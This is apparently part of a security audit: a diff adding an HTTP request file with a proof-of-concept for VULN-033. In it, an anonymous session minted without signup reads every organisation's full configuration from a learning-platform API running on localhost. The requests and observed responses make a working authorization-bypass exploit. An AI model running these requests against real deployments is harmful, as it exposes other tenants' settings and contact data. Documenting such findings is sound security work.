@@ -1,0 +1,27 @@
+### VULN-033 — GET /organization returns full org config to ANY session (incl. an anonymous one)
+
+### Step 0 — baseline: with NO cookie the route rejects.
+GET http://localhost:21527/organization HTTP/1.1
+Host: localhost:21527
+Origin: http://localhost:21526
+### -> HTTP 401 Unauthorized
+
+### Step 1 — mint an unauthenticated anonymous session (VULN-018): no account/signup/invite.
+POST http://localhost:21527/api/auth/sign-in/anonymous HTTP/1.1
+Host: localhost:21527
+Origin: http://localhost:21526
+Content-Type: application/json
+
+{}
+### -> HTTP 200, Set-Cookie: classroomio.session_token=<anon>   (user.isAnonymous=true, orgRoles={})
+
+### Step 2 — read org config with the anonymous session cookie.
+GET http://localhost:21527/organization HTTP/1.1
+Host: localhost:21527
+Origin: http://localhost:21526
+Cookie: classroomio.session_token=<anon>
+
+### Response: HTTP 200 — a LIST of full org config rows (cross-org enumeration), e.g.
+### data[*].organization = { siteName, disableEmailPassword, disableGoogleAuth, disableSignup,
+###   settings, customCode, aiTutorSettings{escalation.email,...}, landingpage, customDomain, plans, ... }
+### Observed 2 orgs: "probe3f8bad" and "cve-hunt-academy" (the anon actor is a member of neither).
